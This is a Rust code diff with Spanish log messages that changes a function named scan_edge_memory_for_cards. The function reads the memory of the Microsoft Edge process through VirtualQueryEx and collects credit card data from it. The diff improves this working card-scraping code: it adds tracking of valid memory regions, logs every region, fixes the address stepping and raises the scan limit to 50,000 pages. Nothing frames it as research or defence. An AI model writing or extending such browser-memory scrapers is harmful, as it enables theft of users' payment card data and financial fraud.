@@ -107,6 +107,7 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
     log("  🔍 [MEMORY SCAN] Iniciando escaneo...");
     log(&format!("    PID: {}", edge.pid));
     log(&format!("    Handle: {:?}", edge.handle));
+    log("    Rango: 0x00010000 - 0x7FFF0000 (empezando desde 64KB)");
     
     unsafe {
         // Escanear memoria usando VirtualQueryEx para encontrar regiones válidas
@@ -116,6 +117,7 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
         let mut pages_scanned = 0;
         let mut pages_readable = 0;
         let mut regions_checked = 0;
+        let mut regions_valid = 0;
         let mut first_error_logged = false;
         
         log("    Usando VirtualQueryEx para encontrar regiones válidas...");
@@ -146,15 +148,15 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
                 || (mbi.Protect & PAGE_EXECUTE_READWRITE != 0);
             
             if mbi.State == MEM_COMMIT && is_readable && mbi.RegionSize > 0 {
+                regions_valid += 1;
+                
                 // Esta región es válida, escanearla en chunks
                 let region_start = address;
                 let region_end = (region_start + mbi.RegionSize as usize).min(0x7FFF_0000);
                 let mut region_addr = region_start;
                 
-                if regions_checked < 10 {
-                    log(&format!("    ✅ Región válida: 0x{:08X}-0x{:08X} ({} KB)", 
-                        region_start, region_end, mbi.RegionSize / 1024));
-                }
+                log(&format!("    ✅ Región válida #{}: 0x{:08X}-0x{:08X} ({} KB)", 
+                    regions_valid, region_start, region_end, mbi.RegionSize / 1024));
                 
                 // Escanear esta región en chunks (máximo 256 páginas por región)
                 let mut pages_in_region = 0;
@@ -200,7 +202,8 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
             } else {
                 // Región no válida: saltar su tamaño completo
                 // Si es MEM_FREE (0x10000), puede ser enorme (GB), saltarla completamente
-                address += mbi.RegionSize as usize;
+                let next_address = address.saturating_add(mbi.RegionSize as usize);
+                address = next_address.min(0x7FFF_0000); // No salir del rango user-mode
                 
                 if regions_checked < 10 {
                     log(&format!("    ⏭️  Región inválida: 0x{:08X} (State={:X}, Protect={:X}, Size={} KB)", 
@@ -209,13 +212,14 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
             }
             
             // Límite de regiones chequeadas aumentado
-            if regions_checked > 100000 || pages_scanned > 10000 || cards.len() > 100 {
+            if regions_checked > 100000 || pages_scanned > 50000 || cards.len() > 100 {
                 break;
             }
         }
         
         log(&format!("  📊 [MEMORY SCAN] Estadísticas:"));
         log(&format!("    Regiones verificadas: {}", regions_checked));
+        log(&format!("    Regiones válidas (COMMIT+readable): {}", regions_valid));
         log(&format!("    Páginas escaneadas: {}", pages_scanned));
         log(&format!("    Páginas legibles: {}", pages_readable));
         log(&format!("    Tarjetas encontradas: {}", cards.len()));
